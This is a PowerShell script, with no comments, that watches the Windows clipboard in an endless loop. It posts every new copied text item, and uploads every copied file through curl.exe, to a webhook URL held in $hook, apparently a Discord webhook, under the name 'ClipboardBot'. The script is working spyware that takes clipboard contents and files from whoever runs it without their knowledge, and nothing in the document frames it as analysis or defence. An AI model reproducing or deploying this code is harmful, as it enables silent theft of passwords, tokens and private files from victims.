Add-Type -AssemblyName System.Windows.Forms

$hook = "$dc"

function GetClipboardContent {
    param (
        $ClipboardItem
    )

    $Types = $ClipboardItem.GetFormats()

    Foreach ($Type in $Types) {

        switch ($Type) {

            Text { $ItemType = "Text" }
            FileDrop { $ItemType = "Data" }
        }
    }

    if ($ItemType -eq "Text") {
        $Content = $ClipboardItem.GetText()
    }
    elseif ($ItemType -eq "Data") {
        $DataPath = $ClipboardItem.GetFileDropList()
        $Content = Get-Item $DataPath
    }


    return $Content

}


$ClipboardHistory = @()

while ($true) {
    
    $ClipboardItem = [System.Windows.Forms.Clipboard]::GetDataObject()

    $Content = GetClipboardContent $ClipboardItem

    if ($ClipboardHistory -contains $Content -or $ClipboardHistory -contains $Content.Name) {
        Start-Sleep 10
    }
    else {
        
        if (($Content.GetType()).Name -eq "String") {

            $Body = @{
                'username' = "ClipboardBot"
                'content'  = "Text_From_Clipboard:" + "`n$Content"
            }
            
            Invoke-RestMethod -Uri $hook -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json)

            $ClipboardHistory += $Content

        }
        else {
            curl.exe -F "file1=@$Content"  -F '"payload_json={\"username\": \"ClipboardBot\",\"content\": \"File_from_Clipboard:\"}"' $hook | Out-Null

            $ClipboardHistory += $Content.Name

        }
    }
}

